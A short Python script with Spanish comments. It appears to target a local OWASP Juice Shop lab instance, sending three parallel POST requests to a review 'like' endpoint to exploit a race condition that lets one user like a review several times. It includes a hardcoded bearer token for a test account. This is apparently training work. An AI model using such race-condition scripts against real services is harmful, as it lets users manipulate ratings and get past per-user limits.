import requests
from concurrent.futures import ThreadPoolExecutor

# URL y cuerpo de la solicitud
url = "http://10.0.2.15:3000/rest/products/reviews"
body = {"id": "QepxQeHdMkXMYMZkC"}  # ID del comentario

# Encabezados HTTP
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "http://10.0.2.15:3000/",
    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwicGFzc3dvcmQiOiI5YWE2ZTVmMjI1NmMxN2QyZDQzMGIxMDAwMzJiOTk3YyIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjQtMDktMTkgMjE6NDk6MjguNTE5ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjQtMDktMTkgMjE6NDk6MjguNTE5ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTcyNjc4NDQyNX0.qrbdspwCsDiZKdniTs0dPZNbSK3j81r8If6kwOgCjoAvo90k0cjUa5HtQtfr3TvRBXOvCrMnucpWqNhpKdTPnfLhxkWldFPcCqi5JtId3WqR74C0zvG8XSXgNMm7vHU8TrEVKblTlkzqf_GzHKAVkQxYqLH6s0bE1UQ1ZQexukc",
    "Content-Type": "application/json",
    "Origin": "http://10.0.2.15:3000",
    "Connection": "keep-alive",
    "Cookie": "language=en; welcomebanner_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."
}

# Función para enviar la solicitud
def like_review():
    response = requests.post(url, json=body, headers=headers)
    if response.status_code == 200:
        return f"Solicitud exitosa: {response.json()}"
    else:
        return f"Error {response.status_code}: {response.text}"

# Enviar la solicitud 3 veces en paralelo
with ThreadPoolExecutor(max_workers=3) as executor:
    futures = [executor.submit(like_review) for _ in range(3)]
    for future in futures:
        print(future.result())
